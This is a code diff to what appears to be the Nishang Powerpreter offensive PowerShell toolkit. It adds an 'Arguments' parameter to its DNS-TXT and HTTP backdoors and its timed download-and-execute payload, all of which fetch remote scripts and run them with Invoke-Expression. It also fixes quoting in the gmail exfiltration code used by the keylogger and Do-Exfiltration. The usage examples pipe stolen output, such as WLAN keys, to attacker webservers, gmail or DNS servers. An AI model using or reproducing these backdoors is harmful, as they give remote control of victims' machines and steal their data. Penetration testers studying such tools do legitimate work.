@@ -1149,6 +1149,9 @@ The domain (or subdomain) whose TXT records would be used to issue commands to t
 .PARAMETER psdomain
 The domain (or subdomain) whose subdomains would be used to provide powershell scripts from TXT records.
 
+.PARAMETER Arguments
+Arguments to be passed to a script. Powerpreter and other scripts in Nishang need the function name and arguments here.
+
 .PARAMETER subdomains
 The number of subdomains which would be used to provide powershell scripts from their TXT records.
 The length of DNS TXT records is assumed to be 255 characters, so more than one subdomains would be required.
@@ -1160,17 +1163,13 @@ The string, if responded by TXT record of startdomain, will stop this payload on
 Authoritative Name Server for the domains (or for startdomain in case you are using separate domains). 
 Startdomain would be changed for commands and an authoritative reply shoudl reflect changes immediately.
 
-.PARAMETER NoLoadFunction
-This parameter is used for specifying that the script used in txt records $psdomain does NOT load a function.
-If the parameter is not specified the payload assumes that the script pulled from txt records would need function name to be executed.
-This need not be specified if you are using Nishang scripts with this backdoor.
 
 .EXAMPLE
 PS > DNS_TXT_Pwnage
 The payload will ask for all required options.
 
 .EXAMPLE
-PS > DNS_TXT_Pwnage -StartDomain start.alteredsecurity.com -cmdstring begincommands -CommandDomain command.alteredsecurity.com -psstring startscript -PSDomain script.alteredsecurity.com -Subdomains 3 -StopString stop -AuthNS ns8.zoneedit.com
+PS > DNS_TXT_Pwnage -StartDomain start.alteredsecurity.com -cmdstring begincommands -CommandDomain command.alteredsecurity.com -psstring startscript -PSDomain script.alteredsecurity.com -Arguments Get-WLAN-Keys -Subdomains 3 -StopString stop -AuthNS ns8.zoneedit.com
 In the above example if you want to execute commands. TXT record of start.alteredsecurity.com
 must contain only "begincommands" and command.alteredsecurity.com should conatin a single command 
 you want to execute. The TXT record could be changed live and the payload will pick up updated 
@@ -1178,10 +1177,11 @@ record to execute new command.
 
 To execute a script in above example, start.alteredsecurity.com must contain "startscript". As soon it matches, the payload will query 
 1.script.alteredsecurity.com, 2.script.alteredsecurity.com and 3.script.alteredsecurity.com looking for a base64encoded powershell script. 
+Use the Arguments paramter if the downloaded script loads a function.
 Use the Out-DnsTxt script in the Utility folder to encode scripts to base64.
 
 .EXAMPLE
-PS > DNS_TXT_Pwnage -StartDomain start.alteredsecurity.com -cmdstring begincommands -CommandDomain command.alteredsecurity.com -psstring startscript -PSDomain encscript.alteredsecurity.com -StopString stop -AuthNS ns8.zoneedit.com | Do-Exfiltration -ExfilOption Webserver -URL http://192.168.254.183/catchpost.php
+PS > DNS_TXT_Pwnage -StartDomain start.alteredsecurity.com -cmdstring begincommands -CommandDomain command.alteredsecurity.com -psstring startscript -PSDomain script.alteredsecurity.com -Arguments Get-WLAN-Keys -Subdomains 3 -StopString stop -AuthNS ns8.zoneedit.com | Do-Exfiltration -ExfilOption Webserver -URL http://192.168.254.183/catchpost.php
 Use above command for sending POST request to your webserver which is able to log the requests.
 
 .LINK
@@ -1212,16 +1212,20 @@ https://github.com/samratashok/nishang
         [String]
         $psdomain,
 
-        [Parameter(Position = 5, Mandatory = $True)]
+        [Parameter(Position = 5, Mandatory = $False)]
+        [String]
+        $Arguments = "Out-Null",
+
+        [Parameter(Position = 6, Mandatory = $True)]
         [String]
         $Subdomains,
 
-        [Parameter(Position = 6, Mandatory = $True)]
+        [Parameter(Position = 7, Mandatory = $True)]
 
         [String]
         $StopString,
 
-        [Parameter(Position = 7, Mandatory = $True)]
+        [Parameter(Position = 8, Mandatory = $True)]
         [String]$AuthNS,
 
 
@@ -1300,17 +1304,14 @@ https://github.com/samratashok/nishang
             $cs = New-Object System.IO.Compression.DeflateStream ($ms, [System.IO.Compression.CompressionMode]::Decompress)
             $sr = New-Object System.IO.StreamReader($cs)
             $command = $sr.readtoend()
-            # Check for the function loaded by the script.
-            $preloading = Get-ChildItem function:\
-            Invoke-Expression $command
-            $postloading = Get-ChildItem function:\
-            $diffobj = Compare-Object $preloading $postloading
-            $FunctionName = $diffobj.InputObject.Name
-            $pastevalue = Invoke-Expression $FunctionName
-            if ($NoLoadFunction -eq $True)
+            $pastevalue = Invoke-Expression $command
+
+            # Check for arguments to the downloaded script.
+            if ($Arguments -ne "Out-Null")
             {
-                $pastevalue = Invoke-Expression $command
+                $pastevalue = Invoke-Expression $Arguments                   
             }
+
             $pastevalue            
             $exec++
             if ($exfil -eq $True)
@@ -1916,8 +1917,11 @@ Payload which waits till given time to execute a script.
 .DESCRIPTION
 This payload waits till the given time (on the victim) and then downloads a PowerShell script and executes it.
 
-.PARAMETER URL
+.PARAMETER PAYLOADURL
 The URL from where the file would be downloaded.
+
+.PARAMETER Arguments
+Arguments to be passed to a script. Powerpreter and other scripts in Nishang need the function name and arguments here.
 
 .PARAMETER time
 The Time when the payload will be executed (in 24 hour format e.g. 23:21).
@@ -1929,10 +1933,10 @@ The URL which the payload would check for instructions to stop.
 The string which if found at CheckURL will stop the payload.
 
 .EXAMPLE
-PS > Execute-OnTime http://example.com/script.ps1 hh:mm http://pastebin.com/raw.php?i=Zhyf8rwh stoppayload
+PS > Execute-OnTime -PayloadURL http://pastebin.com/raw.php?i=Zhyf8rwh -Arguments Get-Information -Time hh:mm -CheckURL http://pastebin.com/raw.php?i=Zhyf8rwh -StopString stoppayload
 
 EXAMPLE
-PS > Execute-OnTime http://pastebin.com/raw.php?i=Zhyf8rwh hh:mm http://pastebin.com/raw.php?i=jqP2vJ3x | Do-Exfiltration -ExfilOption gmail -username <> -Password <>
+PS > Execute-OnTime -PayloadURL http://pastebin.com/raw.php?i=Zhyf8rwh -Arguments Get-Information -Time hh:mm -CheckURL http://pastebin.com/raw.php?i=Zhyf8rwh -StopString stoppayload | Do-Exfiltration -ExfilOption gmail -username <> -Password <>
 
 Use above command for data exfiltration to gmail
 
@@ -1952,13 +1956,18 @@ https://github.com/samratashok/nishang
 
         [Parameter(Position = 1, Mandatory = $True)]
         [String]
-        $time,
+        $Arguments = "Out-Null",
+
 
         [Parameter(Position = 2, Mandatory = $True)]
         [String]
-        $CheckURL,
+        $time,
 
         [Parameter(Position = 3, Mandatory = $True)]
+        [String]
+        $CheckURL,
+
+        [Parameter(Position = 4, Mandatory = $True)]
         [String]
         $StopString
 
@@ -1975,7 +1984,12 @@ https://github.com/samratashok/nishang
         $systime = Get-Date -UFormat %R
         if ($systime -match $time)
         {
-            $pastevalue = Invoke-Expression $webclient.DownloadString($URL)
+            $pastevalue = Invoke-Expression $webclient.DownloadString($PayloadURL)
+            # Check for arguments to the downloaded script.
+            if ($Arguments -ne "Out-Null")
+            {
+                $pastevalue = Invoke-Expression $Arguments                   
+            }
             $pastevalue
             $exec++
             if ($exec -eq 1)
@@ -2131,6 +2145,9 @@ The URL which the payload would query for instructions.
 .PARAMETER PayloadURL
 The URL from where the powershell script would be downloaded.
 
+.PARAMETER Arguments
+Arguments to be passed to a script. Powerpreter and other scripts in Nishang need the function name and arguments here.
+
 .PARAMETER MagicString
 The string which would act as an instruction to the payload to proceed with download and execute.
 
@@ -2144,12 +2161,12 @@ PS > HTTP-Backdoor
 The payload will ask for all required options.
 
 .EXAMPLE
-PS > HTTP-Backdoor http://pastebin.com/raw.php?i=jqP2vJ3x http://pastebin.com/raw.php?i=Zhyf8rwh start123 stopthis
+PS > HTTP-Backdoor -CheckURL http://pastebin.com/raw.php?i=jqP2vJ3x -PayloadURL http://pastebin.com/raw.php?i=Zhyf8rwh -Arguments Get-Information -MagicString start123 -StopString stopthis
 
 Use above when using the payload from non-interactive shells.
 
 .EXAMPLE
-PS > HTTP-Backdoor http://pastebin.com/raw.php?i=jqP2vJ3x http://pastebin.com/raw.php?i=Zhyf8rwh start123 stopthis | Do-Exfiltration -ExfilOption DNS -DomainName example.com -AuthNS 192.168.254.228
+PS > HTTP-Backdoor -CheckURL http://pastebin.com/raw.php?i=jqP2vJ3x -PayloadURL http://pastebin.com/raw.php?i=Zhyf8rwh -Arguments Get-Information -MagicString start123 -StopString stopthis | Do-Exfiltration -ExfilOption DNS -DomainName example.com -AuthNS 192.168.254.228
 
 Use above command for data exfiltration to a DNS server which logs TXT queries.
 
@@ -2170,11 +2187,15 @@ https://github.com/samratashok/nishang
         [String]
         $PayloadURL,
 
-        [Parameter(Position = 2, Mandatory = $True)]
+        [Parameter(Position = 2, Mandatory = $False)]
+        [String]
+        $Arguments = "Out-Null",
+
+        [Parameter(Position = 3, Mandatory = $True)]
         [String]
         $MagicString,
 
-        [Parameter(Position = 3, Mandatory = $True)]
+        [Parameter(Position = 4, Mandatory = $True)]
         [String]
         $StopString
     )
@@ -2188,6 +2209,11 @@ https://github.com/samratashok/nishang
         if($filecontent -eq $MagicString)
         {
             $pastevalue = Invoke-Expression $webclient.DownloadString($PayloadURL)
+            # Check for arguments to the downloaded script.
+            if ($Arguments -ne "Out-Null")
+            {
+                $pastevalue = Invoke-Expression $Arguments                   
+            }
             $pastevalue
             $exec++
             if ($exec -eq 1)
@@ -2473,13 +2499,13 @@ function Keylog
             elseif ($exfiloption -eq "gmail")
             {
                 #http://stackoverflow.com/questions/1252335/send-mail-via-gmail-with-powershell-v2s-send-mailmessage
-                $smtpserver = “smtp.gmail.com”
+                $smtpserver = "smtp.gmail.com"
                 $msg = new-object Net.Mail.MailMessage
                 $smtp = new-object Net.Mail.SmtpClient($smtpServer )
                 $smtp.EnableSsl = $True
-                $smtp.Credentials = New-Object System.Net.NetworkCredential(“$username”, “$password”); 
-                $msg.From = “$username@gmail.com”
-                $msg.To.Add(”$username@gmail.com”)
+                $smtp.Credentials = New-Object System.Net.NetworkCredential("$username", "$password"); 
+                $msg.From = "$username@gmail.com"
+                $msg.To.Add("$username@gmail.com")
                 $msg.Subject = $pastename
                 $msg.Body = $pastevalue
                 if ($filename)
@@ -3762,9 +3788,9 @@ https://github.com/samratashok/nishang
         $msg = new-object Net.Mail.MailMessage
         $smtp = new-object Net.Mail.SmtpClient($smtpServer )
         $smtp.EnableSsl = $True
-        $smtp.Credentials = New-Object System.Net.NetworkCredential(“$username”, “$password”); 
-        $msg.From = “$username@gmail.com”
-        $msg.To.Add(”$username@gmail.com”)
+        $smtp.Credentials = New-Object System.Net.NetworkCredential("$username", "$password"); 
+        $msg.From = "$username@gmail.com"
+        $msg.To.Add("$username@gmail.com")
         $msg.Subject = "Exfiltrated Data"
         $msg.Body = $Data
         if ($filename)
